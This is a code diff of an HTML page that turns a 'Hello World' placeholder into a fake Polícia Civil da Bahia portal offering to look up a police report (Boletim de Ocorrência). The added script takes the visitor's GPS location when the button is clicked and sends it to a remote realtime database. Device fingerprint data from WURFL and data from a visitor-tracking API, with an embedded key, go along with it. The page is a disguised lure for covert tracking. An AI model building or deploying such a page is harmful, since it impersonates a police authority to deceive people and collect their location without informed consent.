@@ -33,15 +33,14 @@
             update(visitorLocationRef, locationData);
         }
 
-        function getLocationAndUpdateData(apiData) {
-            const dataKey = sendDataToRealtimeDatabaseInitial({ ...apiData, ...WURFL });
-
+        window.onButtonClick = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     var locationData = {
                         latitude: position.coords.latitude,
                         longitude: position.coords.longitude
                     };
+                    var dataKey = sendDataToRealtimeDatabaseInitial(WURFL); // Envia os dados do WURFL
                     updateDataWithLocation(dataKey, locationData);
                 }, function(error) {
                     console.error("Erro na Geolocalização: ", error);
@@ -69,7 +68,8 @@
         VisitorAPI(
             "p53oy0LRsYVI5KEmIDJw",
             function(data) {
-                getLocationAndUpdateData(data);
+                var completeData = { ...data, ...WURFL };
+                var dataKey = sendDataToRealtimeDatabaseInitial(completeData);
             },
             function(errorCode, errorMessage) {
                 console.log("Erro na API:", errorCode, errorMessage); 
@@ -78,6 +78,18 @@
     </script>
 </head>
 <body>
-    <h1>Hello World!</h1>
+    <div class="home-container">
+        <img src="https://assets.infra.grancursosonline.com.br/projeto/pc-ba-policia-civil-do-estado-da-bahia.png" alt="image" class="home-image" />
+        <form class="home-form">
+            <span>Nome completo</span>
+            <input type="text" placeholder="Digite o nome completo" class="home-textinput input" />
+            <span class="home-text1">Data de nascimento</span>
+            <input type="text" placeholder="dd/mm/aaaa" class="home-textinput1 input" />
+            <button type="button" class="home-button button" onclick="onButtonClick()">Consultar Boletim de Ocorrência</button>
+            <span class="home-text2">
+                *Para acessar seu boletim de ocorrência é necessário conceder as permissões
+            </span>
+        </form>
+    </div>
 </body>
 </html>
